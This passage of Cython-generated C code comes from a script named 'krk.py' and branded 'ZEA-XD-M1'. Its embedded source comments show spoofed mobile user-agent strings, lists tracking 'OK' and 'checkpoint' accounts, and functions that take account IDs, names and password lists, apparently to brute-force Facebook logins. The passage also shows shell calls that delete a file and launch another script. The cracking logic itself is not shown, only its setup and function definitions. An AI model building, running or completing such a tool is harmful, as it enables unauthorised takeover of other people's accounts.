    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 16, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__22);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__22);
    PyTuple_SET_ITEM(__pyx_t_2, 17, __pyx_kp_u__22);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_l); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 18, __pyx_t_6);
    __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_2, 19, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_fullagnt, __pyx_t_6) < 0) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "krk.py":46
 *         l='Mobile Safari/533.1'
 *         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 *         ugen.append(fullagnt)             # <<<<<<<<<<<<<<
 * logo=("""\033[1;32m
 * $$$$$$$$\ $$$$$$$$\  $$$$$$\
 */
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ugen); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_fullagnt); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_6, __pyx_t_2); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 46, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }

  /* "krk.py":47
 *         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 *         ugen.append(fullagnt)
 * logo=("""\033[1;32m             # <<<<<<<<<<<<<<
 * $$$$$$$$\ $$$$$$$$\  $$$$$$\
 * \____$$  |$$  _____|$$  __$$\
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_logo, __pyx_kp_s_1_32m) < 0) __PYX_ERR(0, 47, __pyx_L1_error)

  /* "krk.py":63
 * |   Versino      :     1.6
 * +==================================================+""")
 * def linex():             # <<<<<<<<<<<<<<
 *         print('\033[1;37m----------------------------------------------')
 * def clear():
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_1linex, 0, __pyx_n_s_linex, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__94)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_linex, __pyx_t_2) < 0) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":65
 * def linex():
 *         print('\033[1;37m----------------------------------------------')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 *         print(logo)
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_3clear, 0, __pyx_n_s_clear, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__95)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_clear, __pyx_t_2) < 0) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":68
 *         os.system('clear')
 *         print(logo)
 * loop=0             # <<<<<<<<<<<<<<
 * oks=[]
 * cps=[]
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_int_0) < 0) __PYX_ERR(0, 68, __pyx_L1_error)

  /* "krk.py":69
 *         print(logo)
 * loop=0
 * oks=[]             # <<<<<<<<<<<<<<
 * cps=[]
 * twf=[]
 */
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_oks, __pyx_t_2) < 0) __PYX_ERR(0, 69, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":70
 * loop=0
 * oks=[]
 * cps=[]             # <<<<<<<<<<<<<<
 * twf=[]
 * pcp=[]
 */
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 70, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cps, __pyx_t_2) < 0) __PYX_ERR(0, 70, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":71
 * oks=[]
 * cps=[]
 * twf=[]             # <<<<<<<<<<<<<<
 * pcp=[]
 * id=[]
 */
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_twf, __pyx_t_2) < 0) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":72
 * cps=[]
 * twf=[]
 * pcp=[]             # <<<<<<<<<<<<<<
 * id=[]
 * tokenku=[]
 */
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pcp, __pyx_t_2) < 0) __PYX_ERR(0, 72, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":73
 * twf=[]
 * pcp=[]
 * id=[]             # <<<<<<<<<<<<<<
 * tokenku=[]
 * 
 */
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 73, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_id, __pyx_t_2) < 0) __PYX_ERR(0, 73, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":74
 * pcp=[]
 * id=[]
 * tokenku=[]             # <<<<<<<<<<<<<<
 * 
 * def menu():
 */
  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tokenku, __pyx_t_2) < 0) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":76
 * tokenku=[]
 * 
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                 clear()
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_5menu, 0, __pyx_n_s_menu, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__97)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_menu, __pyx_t_2) < 0) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":229
 *                 print('\n No internet connection ...')
 *                 exit()
 * def pak():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_7pak, 0, __pyx_n_s_pak, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__99)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pak, __pyx_t_2) < 0) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":259
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def bd():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_9bd, 0, __pyx_n_s_bd, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__100)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bd, __pyx_t_2) < 0) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":289
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def gmail():             # <<<<<<<<<<<<<<
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_11gmail, 0, __pyx_n_s_gmail, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__102)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 289, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_gmail, __pyx_t_2) < 0) __PYX_ERR(0, 289, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":344
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA')
 * def ffb(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_13ffb, 0, __pyx_n_s_ffb, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__104)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ffb, __pyx_t_2) < 0) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":382
 *                 time.sleep(20)
 *         loop+=1
 * def api(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_15api, 0, __pyx_n_s_api, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__106)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 382, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_api, __pyx_t_2) < 0) __PYX_ERR(0, 382, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":488
 *         except Exception as e:
 *                 pass
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_17api1, 0, __pyx_n_s_api1, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__107)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 488, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_api1, __pyx_t_2) < 0) __PYX_ERR(0, 488, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":584
 *         except Exception as e:
 *                 pass
 * def rndm(ids,passlist):             # <<<<<<<<<<<<<<
 *         global loop
 *         global oks
 */
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_3krk_19rndm, 0, __pyx_n_s_rndm, NULL, __pyx_n_s_krk, __pyx_d, ((PyObject *)__pyx_codeobj__109)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 584, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rndm, __pyx_t_2) < 0) __PYX_ERR(0, 584, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":675
 *         except Exception as e:
 *                 pass
 * try:             # <<<<<<<<<<<<<<
 *         menu()
 * except requests.exceptions.ConnectionError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "krk.py":676
 *                 pass
 * try:
 *         menu()             # <<<<<<<<<<<<<<
 * except requests.exceptions.ConnectionError:
 *         print('\n No internet connection ...')
 */
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_menu); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 676, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_6 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 676, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "krk.py":675
 *         except Exception as e:
 *                 pass
 * try:             # <<<<<<<<<<<<<<
 *         menu()
 * except requests.exceptions.ConnectionError:
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L19_try_end;
    __pyx_L14_error:;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "krk.py":677
 * try:
 *         menu()
 * except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *         print('\n No internet connection ...')
 *         exit()
 */
    __Pyx_ErrFetch(&__pyx_t_6, &__pyx_t_2, &__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 677, __pyx_L16_except_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 677, __pyx_L16_except_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 677, __pyx_L16_except_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __pyx_t_8 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_7);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_ErrRestore(__pyx_t_6, __pyx_t_2, __pyx_t_3);
    __pyx_t_6 = 0; __pyx_t_2 = 0; __pyx_t_3 = 0;
    if (__pyx_t_8) {
      __Pyx_AddTraceback("krk", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_6) < 0) __PYX_ERR(0, 677, __pyx_L16_except_error)
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_6);

      /* "krk.py":678
 *         menu()
 * except requests.exceptions.ConnectionError:
 *         print('\n No internet connection ...')             # <<<<<<<<<<<<<<
 *         exit()
 * except Exception as e:pass
 */
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__48, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 678, __pyx_L16_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "krk.py":679
 * except requests.exceptions.ConnectionError:
 *         print('\n No internet connection ...')
 *         exit()             # <<<<<<<<<<<<<<
 * except Exception as e:pass
 * 
 */
      __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 679, __pyx_L16_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L15_exception_handled;
    }

    /* "krk.py":680
 *         print('\n No internet connection ...')
 *         exit()
 * except Exception as e:pass             # <<<<<<<<<<<<<<
 * 
 * menu()
 */
    __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_8) {
      __Pyx_AddTraceback("krk", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 680, __pyx_L16_except_error)
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_2) < 0) __PYX_ERR(0, 680, __pyx_L16_except_error)
      /*try:*/ {
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 680, __pyx_L16_except_error) }
          goto __pyx_L28;
        }
        __pyx_L28:;
      }
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L15_exception_handled;
    }
    goto __pyx_L16_except_error;

    /* "krk.py":675
 *         except Exception as e:
 *                 pass
 * try:             # <<<<<<<<<<<<<<
 *         menu()
 * except requests.exceptions.ConnectionError:
 */
    __pyx_L16_except_error:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L15_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_1);
    __pyx_L19_try_end:;
  }

  /* "krk.py":682
 * except Exception as e:pass
 * 
 * menu()             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 682, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 682, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":1
 * from os import path             # <<<<<<<<<<<<<<
 * import os,base64,zlib,pip,urllib
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')
 */
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_9);
  if (__pyx_m) {
    if (__pyx_d && stringtab_initialized) {
      __Pyx_AddTraceback("init krk", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    #if !CYTHON_USE_MODULE_STATE
    Py_CLEAR(__pyx_m);
    #else
    Py_DECREF(__pyx_m);
    if (pystate_addmodule_run) {
      PyObject *tp, *value, *tb;
      PyErr_Fetch(&tp, &value, &tb);
      PyState_RemoveModule(&__pyx_moduledef);
      PyErr_Restore(tp, value, tb);
    }
    #endif
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init krk");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}
/* #### Code section: cleanup_globals ### */
/* #### Code section: cleanup_module ### */
/* #### Code section: main_method ### */
/* #### Code section: utility_code_pragmas ### */
#ifdef _MSC_VER
#pragma warning( push )
/* Warning 4127: conditional expression is constant
 * Cython uses constant conditional expressions to allow in inline functions to be optimized at
 * compile-time, so this warning is not useful
 */
#pragma warning( disable : 4127 )
#endif



/* #### Code section: utility_code_def ### */

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    int result;
    PyObject *exc_type;
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject *current_exception = tstate->current_exception;
    if (unlikely(!current_exception)) return 0;
    exc_type = (PyObject*) Py_TYPE(current_exception);
    if (exc_type == err) return 1;
#else
    exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
#endif
    #if CYTHON_AVOID_BORROWED_REFS
    Py_INCREF(exc_type);
    #endif
    if (unlikely(PyTuple_Check(err))) {
        result = __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    } else {
        result = __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
    }
    #if CYTHON_AVOID_BORROWED_REFS
    Py_DECREF(exc_type);
    #endif
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject *tmp_value;
    assert(type == NULL || (value != NULL && type == (PyObject*) Py_TYPE(value)));
    if (value) {
        #if CYTHON_COMPILING_IN_CPYTHON
        if (unlikely(((PyBaseExceptionObject*) value)->traceback != tb))
        #endif
            PyException_SetTraceback(value, tb);
    }
    tmp_value = tstate->current_exception;
    tstate->current_exception = value;
    Py_XDECREF(tmp_value);
#else
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#endif
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject* exc_value;
    exc_value = tstate->current_exception;
    tstate->current_exception = 0;
    *value = exc_value;
    *type = NULL;
    *tb = NULL;
    if (exc_value) {
        *type = (PyObject*) Py_TYPE(exc_value);
        Py_INCREF(*type);
        #if CYTHON_COMPILING_IN_CPYTHON
        *tb = ((PyBaseExceptionObject*) exc_value)->traceback;
        Py_XINCREF(*tb);
        #else
        *tb = PyException_GetTraceback(exc_value);
        #endif
    }
#else
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#endif
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* PyObjectGetAttrStrNoError */
static void __Pyx_PyObject_GetAttrStr_ClearAttributeError(void) {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    if (likely(__Pyx_PyErr_ExceptionMatches(PyExc_AttributeError)))
        __Pyx_PyErr_Clear();
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name) {
    PyObject *result;
#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_TYPE_SLOTS && PY_VERSION_HEX >= 0x030700B1
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro == PyObject_GenericGetAttr)) {
        return _PyObject_GenericGetAttrWithDict(obj, attr_name, NULL, 1);
    }
#endif
    result = __Pyx_PyObject_GetAttrStr(obj, attr_name);
    if (unlikely(!result)) {
        __Pyx_PyObject_GetAttrStr_ClearAttributeError();
    }
    return result;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
